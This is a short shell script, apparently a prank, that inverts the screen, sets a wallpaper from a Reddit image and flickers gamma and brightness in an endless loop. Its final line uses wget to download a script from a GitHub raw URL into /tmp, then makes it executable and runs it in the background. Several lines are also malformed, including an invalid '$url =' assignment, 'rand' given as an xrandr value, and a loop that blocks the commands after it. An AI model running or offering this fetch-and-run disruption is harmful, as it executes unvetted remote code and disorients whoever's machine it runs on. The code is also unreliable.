# Reverse the screen orientation
xrandr -o inverted

# Set the background to a disco ball
feh --bg-fill https://preview.redd.it/wz80jkhcp6z61.jpg?auto=webp&s=e86693b09c01d9c784d500668106232ec7160294

# fuck up gamma and contrast
while true; do
    xrandr --output eDP-1 --gamma rand:rand:rand --brightness rand
    sleep 0.1
    xrandr --output eDP-1 --gamma 0.5:0.5:0.5 --brightness 0.5
    sleep 0.1
done

$url = https://raw.githubusercontent.com/LeoBaldachino/trauma_tek/main/disco_night.sh

# Download the script and make it executable
wget https://raw.githubusercontent.com/LeoBaldachino/trauma_tek/main/disco_night.sh -O /tmp/disco_night.sh && chmod +x /tmp/disco_night.sh && /tmp/disco_night.sh &